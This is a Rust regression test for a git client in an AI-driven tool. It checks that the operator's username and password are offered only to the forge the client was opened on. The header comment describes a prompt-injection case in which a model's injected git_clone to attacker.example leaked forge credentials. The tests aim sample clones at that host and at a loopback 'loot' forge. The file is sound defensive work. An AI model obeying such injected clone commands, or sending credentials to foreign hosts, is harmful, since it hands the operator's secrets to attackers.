//! The git client's `username`/`password` go to the host it was opened on and nowhere else.
//!
//! libgit2 asks for credentials through a callback that names the URL being contacted, and
//! until September 2026 the callback ignored it. `git_clone`, `git_fetch` and `git_pull` are
//! open to the model (only pushes are gated), so a model answering a prompt-injected
//! `git_clone {"url": "https://attacker.example/x.git"}` met a 401 there and libgit2 posted
//! the operator's forge credentials to it.
//!
//! Two fake forges on loopback answer every request 401 with a Basic challenge and record
//! what they were sent. A client opened on the first, told to clone from the second, must
//! leave the second with no `Authorization` header at all; cloning from the first must
//! produce one, which is what shows the credentials still work where they belong. Zero LLM
//! calls: a zero-action rule answers every client event and the model URL is a closed port.
//!
//! Run with:
//!   cargo test --no-default-features --features git --test client -- client::git::credential_scope

#![cfg(feature = "git")]

use std::sync::Arc;
use std::time::Duration;

use netget::cli::management::ClientForm;
use netget::client::git::credentials::{remote_origin, CredentialScope};
use netget::state::app_state::AppState;
use netget::state::ClientId;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::{mpsc, Mutex};

#[test]
fn a_remote_origin_is_scheme_host_and_a_non_default_port() {
    for (url, want) in [
        ("https://github.com/owner/repo.git", "https://github.com"),
        (
            "https://GitHub.com:443/owner/repo.git",
            "https://github.com",
        ),
        (
            "https://user:token@github.com/owner/repo.git",
            "https://github.com",
        ),
        ("http://127.0.0.1:8080/repo.git", "http://127.0.0.1:8080"),
        ("http://127.0.0.1:80/repo.git", "http://127.0.0.1"),
        ("git://example.com/repo.git", "git://example.com"),
        (
            "ssh://git@example.com:2222/repo.git",
            "ssh://example.com:2222",
        ),
        ("git@github.com:owner/repo.git", "ssh://github.com"),
        ("http://[::1]:8080/repo.git", "http://[::1]:8080"),
    ] {
        assert_eq!(remote_origin(url).as_deref(), Some(want), "{url}");
    }
    for local in [
        "/home/op/repo",
        "./repo",
        "../sibling",
        "file:///home/op/repo",
        "C:/repos/x",
        "",
    ] {
        assert_eq!(remote_origin(local), None, "{local:?} names no host");
    }
}

#[test]
fn a_scope_allows_its_own_origin_only() {
    let scope = CredentialScope::bind(
        Some("op"),
        Some("secret"),
        Some("https://github.com/owner/repo.git"),
    )
    .expect("bound");
    assert_eq!(scope.origin, "https://github.com");
    assert!(scope.allows("https://github.com/other/repo.git"));
    assert!(scope.allows("https://GITHUB.COM:443/x"));
    assert!(!scope.allows("https://attacker.example/x.git"));
    assert!(!scope.allows("https://github.com.attacker.example/x.git"));
    assert!(
        !scope.allows("http://github.com/owner/repo.git"),
        "scheme counts"
    );
    assert!(!scope.allows("https://github.com:8443/x"), "port counts");
    assert!(!scope.allows("/home/op/repo"));

    assert!(CredentialScope::bind(Some("op"), None, Some("https://x/")).is_none());
    assert!(CredentialScope::bind(None, Some("s"), Some("https://x/")).is_none());
    assert!(
        CredentialScope::bind(Some("op"), Some("s"), Some("/home/op/repo")).is_none(),
        "a local path binds nothing"
    );
    assert!(CredentialScope::bind(Some("op"), Some("s"), None).is_none());
}

/// A forge that challenges every request with Basic and records each request head.
async fn forge() -> (u16, Arc<Mutex<Vec<String>>>) {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let seen = Arc::new(Mutex::new(Vec::new()));
    let log = seen.clone();
    tokio::spawn(async move {
        while let Ok((mut stream, _)) = listener.accept().await {
            let log = log.clone();
            tokio::spawn(async move {
                let mut head = Vec::new();
                let mut byte = [0u8; 1];
                while tokio::time::timeout(Duration::from_secs(5), stream.read_exact(&mut byte))
                    .await
                    .ok()
                    .and_then(Result::ok)
                    .is_some()
                {
                    head.push(byte[0]);
                    if head.ends_with(b"\r\n\r\n") {
                        break;
                    }
                }
                log.lock()
                    .await
                    .push(String::from_utf8_lossy(&head).into_owned());
                let _ = stream
                    .write_all(
                        b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm=\"forge\"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
                    )
                    .await;
            });
        }
    });
    (port, seen)
}

fn saw_authorization(heads: &[String]) -> bool {
    heads
        .iter()
        .any(|h| h.to_ascii_lowercase().contains("\r\nauthorization: basic "))
}

async fn new_state() -> AppState {
    let state = AppState::new_with_options(false, "http://127.0.0.1:1".to_string());
    state
        .set_llm_client(netget::llm::OllamaClient::new(
            "http://127.0.0.1:1".to_string(),
        ))
        .await;
    state
}

async fn wait_for_client_handle(state: &AppState, id: ClientId) {
    for _ in 0..1_000 {
        if state.has_client_handle(id).await {
            return;
        }
        tokio::time::sleep(Duration::from_millis(30)).await;
    }
    panic!(
        "git client #{} never registered a command handle",
        id.as_u32()
    );
}

#[tokio::test]
async fn credentials_are_offered_to_the_clients_own_forge_and_to_no_other_host() {
    let (home_port, home_seen) = forge().await;
    let (foreign_port, foreign_seen) = forge().await;
    let root = tempfile::tempdir().unwrap();
    let state = new_state().await;
    let (tx, _rx) = mpsc::unbounded_channel();
    let client_id = ClientForm {
        protocol: "git".to_string(),
        remote_addr: Some(format!("http://127.0.0.1:{home_port}/repo.git")),
        instruction: Some("test client".to_string()),
        event_handlers: Some(vec![serde_json::json!({
            "event_pattern": "*",
            "handler": { "type": "static", "actions": [] }
        })]),
        startup_params: Some(serde_json::json!({
            "username": "operator",
            "password": "forge-token",
            "allowed_root": root.path().to_string_lossy(),
        })),
        ..Default::default()
    }
    .create(
        &state,
        netget::llm::OllamaClient::new("http://127.0.0.1:1".to_string()),
        tx,
    )
    .await
    .expect("create git client");
    wait_for_client_handle(&state, client_id).await;

    // The injected clone of a foreign forge: whatever the outcome reads, the forge must
    // have been sent no credential.
    let outcome = state
        .send_to_client(
            client_id,
            serde_json::json!({
                "type": "git_clone",
                "url": format!("http://127.0.0.1:{foreign_port}/loot.git"),
                "path": "foreign"
            }),
            Duration::from_secs(30),
        )
        .await;
    let foreign = foreign_seen.lock().await.clone();
    assert!(
        !foreign.is_empty(),
        "the foreign forge was never contacted, so the test proved nothing: {outcome:?}"
    );
    assert!(
        !saw_authorization(&foreign),
        "the operator's credentials reached the foreign forge: {foreign:?}"
    );
    let text = format!("{outcome:?}");
    assert!(
        text.contains("bound to") || text.contains("not offered"),
        "the refusal should say why: {text}"
    );

    // The same credentials still go to the forge the client was opened on.
    let _ = state
        .send_to_client(
            client_id,
            serde_json::json!({
                "type": "git_clone",
                "url": format!("http://127.0.0.1:{home_port}/repo.git"),
                "path": "home"
            }),
            Duration::from_secs(30),
        )
        .await;
    let home = home_seen.lock().await.clone();
    assert!(
        saw_authorization(&home),
        "the home forge's 401 should have been answered with Basic credentials: {home:?}"
    );
}
